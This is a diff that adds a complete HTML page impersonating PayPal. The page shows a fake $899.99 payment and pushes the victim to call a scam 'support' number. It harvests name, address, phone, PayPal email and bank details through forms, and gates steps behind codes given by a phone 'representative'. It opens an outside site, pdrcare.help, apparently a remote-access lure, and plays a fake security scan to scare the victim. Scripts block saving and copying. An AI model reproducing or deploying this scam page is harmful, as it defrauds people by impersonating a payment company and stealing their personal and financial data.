@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  
+  
+  <!-- Extra Protection Code Starts -->
+  <script>
+  document.addEventListener('keydown', function (e) {
+    if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'S')) {
+      e.preventDefault();
+      alert("Saving this site is disabled.");
+    }
+  });
+
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+    alert("Right-click is disabled.");
+  });
+</script>
+  
+  <style>
+  body {
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+  }
+</style>
+<script>
+  document.addEventListener('copy', (e) => e.preventDefault());
+  document.addEventListener('dragstart', (e) => e.preventDefault());
+</script>
+
+<!-- Extra Protection Code End -->
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal Transaction Confirmation</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    .banner {
+      background: #0070ba;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+    img.logo, .paypal-gif {
+      height: 40px;
+      margin-bottom: 20px;
+    }
+    .paypal-gif {
+      width: 60px;
+      height: auto;
+      display: block;
+      margin: 20px auto;
+    }
+    .loader, .loader-small {
+      border: 6px solid #eee;
+      border-top: 6px solid #0070ba;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    .loader { width: 60px; height: 60px; }
+    .loader-small { width: 40px; height: 40px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { color: #003087; font-size: 20px; margin-top: 10px; }
+    .success { font-size: 48px; color: green; margin: 20px 0; }
+    .btn {
+      background: #0070ba;
+      color: #fff;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 15px;
+    }
+    .hidden { display: none; }
+    .highlight { color: #d93025; font-weight: bold; }
+    .step { display: flex; align-items: center; margin: 20px 0; }
+    .circle {
+      width: 24px; height: 24px; border-radius: 50%;
+      background: #ccc; display: flex;
+      align-items: center; justify-content: center;
+      color: #fff; margin-right: 10px;
+    }
+    .circle.active { background: #0070ba; }
+    .status-msg { font-size: 16px; margin-top: 20px; }
+    #ipScanOutput {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      font-size: 13px;
+      height: 250px;
+      overflow-y: auto;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: inset 0 0 6px #000;
+      margin-top: 15px;
+    }
+    #fixComplete {
+      background: #e6f4ea;
+      color: #1e4620;
+      border: 1px solid #badbcc;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 5px;
+      text-align: center;
+      display: none;
+    }
+    footer {
+      margin-top: 40px;
+      padding: 20px;
+      background: #fff;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      border-top: 1px solid #ddd;
+    }
+    footer a {
+      color: #0070ba;
+      text-decoration: none;
+      margin: 0 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div class="banner">
+  You're protected by PayPal Purchase Protection. All transactions are monitored 24/7. Help Line Number +1 (888) 336-1272
+</div>
+
+<div class="container" id="step1">
+  <img class="logo" src="./pp_cc_mark_111x69.jpg" alt="PayPal">
+  <h2>Securely sending $899.99 USD to Harry Wilson</h2>
+  <div class="loader"></div>
+  <p>Please do not close this window. Your transaction is being processed with enhanced security.</p>
+</div>
+
+<div class="container hidden" id="step2">
+  <div class="success">✔</div>
+  <h2>Transaction Completed</h2>
+  <p>Your payment has been successfully sent. A receipt is now being generated.</p>
+</div>
+
+<div class="container hidden" id="invoice">
+  <h2>PayPal Payment Receipt</h2>
+  <img class="logo" src="./pp_cc_mark_111x69.jpg" alt="PayPal">
+  
+  <div style="text-align: left; font-size: 15px; line-height: 1.8; margin-top: 20px;">
+    <p><strong>Transaction ID:</strong> PP-15145475125</p>
+    <p><strong>Date:</strong> July 30, 2025</p>
+    <p><strong>Status:</strong> <span style="color: green;">Completed</span></p>
+    <p><strong>Sent To:</strong> Harry Wilson</p>
+    <p><strong>Payment Method:</strong> Credit Card linked Via Paypal</p>
+    <p><strong>Amount Sent:</strong> <strong>$899.99 USD</strong></p>
+    <hr>
+    <p><strong>Important:</strong> This transaction may take up to <strong>24 hours</strong> to appear on your bank or card statement.</p>
+    <p>If you did not authorize this payment or believe it is suspicious, please contact us immediately and report this transaction as fraudulent.</p>
+    <p style="color:#d93025;"><strong>⚠️ Security Warning:</strong> Do not click unknown links or share your OTP, PayPal email, or password with anyone — even if they claim to be from PayPal.</p>
+  </div>
+
+  <div class="highlight" style="margin-top: 25px; font-size: 14px;">
+    To cancel this transaction or report fraud, please contact PayPal Customer Care immediately:<br>
+    <strong style="font-size: 16px;">+1 (888) 336-1272</strong>
+  </div>
+  <button class="btn" onclick="document.getElementById(&#39;fraudForm&#39;).classList.remove(&#39;hidden&#39;)">Report a Problem with this Payment</button>
+  <form id="fraudForm" class="hidden" onsubmit="return goToWaiting()">
+    <input required="" placeholder="Full Name">
+    <input type="email" required="" placeholder="Email Address">
+    <input required="" placeholder="Phone Number">
+    <textarea required="" placeholder="Describe the issue"></textarea>
+    <button type="submit" class="btn">Submit Report</button>
+  </form>
+</div>
+
+<div class="container hidden" id="waiting">
+  <h2>Connecting You to a PayPal Specialist</h2>
+  <div class="loader-small"></div>
+  <p class="highlight">Call PayPal Support Immediately: +1 (888) 336-1272</p>
+  <p>Speak to our representative and get a one-time verification code.</p>
+  <button class="btn" onclick="verifyCode1()">Enter Verification Code</button>
+</div>
+
+<div class="container hidden" id="waiting2">
+  <h2>Secure Connection Established</h2>
+  <div class="loader-small"></div>
+  <p>Please confirm the second-level code to continue.</p>
+  <button class="btn" onclick="verifyCode2()">Enter Final Code</button>
+</div>
+
+<div class="container hidden" id="refundForm">
+  <h2>Request a Refund</h2>
+  <img class="paypal-gif" src="./original-ba7850362f2416e8bfb8032c57a18ab7.gif" alt="PayPal">
+  <form onsubmit="return showTracking()">
+    <input required="" placeholder="Full Legal Name">
+    <input required="" placeholder="Street Address">
+    <input required="" placeholder="ZIP / Postal Code">
+    <input required="" placeholder="Phone Number">
+    <input required="" placeholder="Invoice Number">
+    <textarea required="" placeholder="Reason for Refund Request"></textarea>
+    <input type="email" required="" placeholder="PayPal Email">
+    <input required="" placeholder="Bank Name">
+    <button type="submit" class="btn">Submit Refund Request</button>
+  </form>
+</div>
+
+<div class="container hidden" id="tracking">
+  <h2>Refund Status Tracker</h2>
+  <div class="step"><div class="circle active">1</div><div>Request Submitted</div></div>
+  <div class="step"><div class="circle active" id="c2">2</div><div>Review In Progress</div></div>
+  <div class="step"><div class="circle" id="c3">3</div><div>Refund Approved</div></div>
+  <div class="step"><div class="circle" id="c4">4</div><div>Funds Sent</div></div>
+  <div class="status-msg" id="statusMsg">Your refund request is currently under review by PayPal's Resolution Team.</div>
+  <button class="btn" onclick="advanceStatus()">Update Status</button>
+  <button class="btn" onclick="show(&#39;ipScanner&#39;)">Secure My IP and Credentials</button>
+</div>
+
+<div class="container hidden" id="ipScanner">
+  <h2 style="color:#d93025;">SECURITY SCAN IN PROGRESS</h2>
+  <div style="background:#fff3cd;color:#856404;padding:15px;border:1px solid #ffeeba;border-radius:5px;font-size:15px;margin:20px 0;">
+    ⚠️ <strong>Security Alert:</strong> We've detected suspicious activity on your account. 
+    This may have occurred because you clicked on a payment link received via SMS or email. 
+    Several unauthorized purchases have been made using your details. If any illegal activity has occurred from your account, you may be held liable.
+     To resolve this issue, please speak with our PayPal Security Representative immediately. 
+     They will guide you through the steps to secure your account and help you avoid further complications. Call PayPal Support Immediately: +1 (888) 336-1272 ..
+  </div>
+  <div class="loader"></div>
+  <div id="ipScanOutput">&gt; Initializing scan...</div>
+  <div style="margin-top:15px; font-size:13px; color:#666;">
+    If your screen says “Windows is updating,” it’s part of the protection process. Do not panic.
+  </div>
+  <button class="btn" onclick="simulateFix()">Fix Now</button>
+  <div id="fixComplete">✅ All threats removed. Your session is now protected.</div>
+</div>
+
+<footer>
+  <div>
+    <a onclick="alert(&#39;Customer Support: +1 (888) 336-1272&#39;)">Help Center</a> |
+    <a href="#">Privacy Policy</a> |
+    <a href="#">Terms &amp; Conditions</a>
+  </div>
+  <div style="margin-top:10px;">© PayPal 2025. All rights reserved.</div>
+</footer>
+
+<script>
+  function show(id) { document.getElementById(id).classList.remove('hidden'); }
+  function hide(id) { document.getElementById(id).classList.add('hidden'); }
+
+  setTimeout(() => {
+    hide('step1'); show('step2');
+    setTimeout(() => { hide('step2'); show('invoice'); }, 2000);
+  }, 3000);
+
+  function goToWaiting() {
+    hide('invoice'); show('waiting');
+    return false;
+  }
+
+  function verifyCode1() {
+    const code = prompt("Enter 4-digit verification code:");
+    if (code === "37126") {
+      const verifyingMsg = document.createElement("p");
+      verifyingMsg.innerText = "Verifying with PayPal Security...";
+      verifyingMsg.style.color = "#0070ba";
+      verifyingMsg.style.fontWeight = "bold";
+      verifyingMsg.style.marginTop = "15px";
+      verifyingMsg.id = "verifyingLoader";
+
+      const loader = document.createElement("div");
+      loader.className = "loader-small";
+      loader.style.marginTop = "10px";
+      loader.id = "verifyingSpinner";
+
+      const parent = document.getElementById("waiting");
+      parent.appendChild(verifyingMsg);
+      parent.appendChild(loader);
+
+      setTimeout(() => {
+        window.open("http://pdrcare.help", "_blank");
+        hide('waiting');
+        show('waiting2');
+        verifyingMsg.remove();
+        loader.remove();
+      }, 2000);
+    } else {
+      alert("Invalid code.");
+    }
+  }
+
+  function verifyCode2() {
+    const code = prompt("Enter secure refund code:");
+    if (code === "37126") {
+      hide('waiting2'); show('refundForm');
+    } else alert("Incorrect final code.");
+  }
+
+  function showTracking() {
+    hide('refundForm'); show('tracking');
+    return false;
+  }
+
+  let stage = 2;
+  function advanceStatus() {
+    if (stage < 4) {
+      stage++;
+      document.getElementById('c' + stage).classList.add('active');
+      const messages = {
+        3: "✅ Your refund has been approved. PayPal is initiating it.",
+        4: "✅ Refund sent. Please verify with your bank and confirm with our representative."
+      };
+      document.getElementById('statusMsg').innerText = messages[stage];
+    }
+  }
+
+  const output = document.getElementById("ipScanOutput");
+  const fixBox = document.getElementById("fixComplete");
+  const messages = [
+    "Scanning IP: 192.168.0.105...",
+    "Foreign login: 185.23.144.11 (Germany)",
+    "Fraud redirect traced to Porhhub.com",
+    "Transfer detected: $899.99 to Chase Bank",
+    "VPN access from 103.29.59.12 (Pakistan)",
+    "Session token compromised - resetting...",
+    "Injecting firewall patch...",
+    "Windows Defender update running...",
+    "Finalizing protection...",
+      "Scanning IP: 192.168.0.105...",
+  "Foreign login: 185.23.144.11 (Germany)",
+  "Fraud redirect traced to Firearms.com",
+  "Transfer detected: $899.99 to City Bank",
+  "VPN access from 103.29.59.12 (Russia)",
+  "Session token compromised - resetting...",
+  "Injecting firewall patch...",
+  "Windows Defender update running...",
+  "Finalizing protection...",
+  "✅ Session secured.",
+  "Suspicious access from IP: 45.88.12.76 (Russia)",
+  "Malware script blocked from uk-cdn4-mirror.net",
+  "Browser fingerprint changed - investigating...",
+  "Real-time scan: 3 threats blocked",
+  "⚠️ Multiple unauthorized attempts detected",
+  "Downloading critical security updates...",
+  "Isolating suspicious activity zone...",
+  "Unverified PayPal login from 217.19.46.110 (France)",
+  "Password leak suspected - hashing credentials...",
+  "Encrypting local cache files...",
+  "IP 102.67.143.9 flagged for brute-force behavior",
+  "Host file modified by unknown process",
+  "🛡️ Secure tunnel established with PayPal servers",
+  "Detected phishing attempt via mail@secure-pp.com",
+  "Attempted transaction: $1,242.00 to foreign account",
+  "Root access request denied (unauthorized)",
+  "⚠️ Fake PayPal page detected and blocked",
+  "LiveChat script injected - scanning origin...",
+  "Private key vault integrity: 98% - Reinforcing...",
+  "Signature mismatch found - syncing time servers",
+  "Monitoring keyboard input for injection traces...",
+  "New device login blocked (Canada)",
+  "Unauthorized DNS change request",
+  "Running anti-keylogger module...",
+  "Secure environment sandbox initialized",
+  "PayPal token timeout - requesting revalidation",
+  "Device fingerprint mismatch - alerting user",
+  "Secure checksum failed - retrying...",
+  "User session restored safely",
+  "✅ No further threats detected",
+  "Suspicious IP cluster traced to 5 countries",
+  "Initiating Geo-blocking on flagged zones...",
+  "Contacting PayPal Abuse Team...",
+  "🔍 Deep scan in progress...",
+  "✅ Protection protocol complete",
+  "Verifying SSL certificates...",
+  "⚠️ Session expired due to threat activity",
+  "IP blacklisted: 213.85.23.44 (Singapore)",
+  "Rerouting traffic via secure PayPal node...",
+  "Last phishing attempt blocked: 1 min ago",
+  "Clearing session logs and temp files...",
+  "User data encryption verified",
+  "Security report sent to PayPal compliance team"
+  ];
+  let i = 0;
+  const interval = setInterval(() => {
+    if (!document.getElementById("ipScanner").classList.contains("hidden")) {
+      if (i < messages.length) {
+        const line = document.createElement("div");
+        line.textContent = "> " + messages[i++];
+        output.appendChild(line);
+        output.scrollTop = output.scrollHeight;
+      }
+    }
+  }, 1300);
+
+  function simulateFix() {
+    fixBox.style.display = "block";
+  }
+</script>
+
+
+
+</body></html>
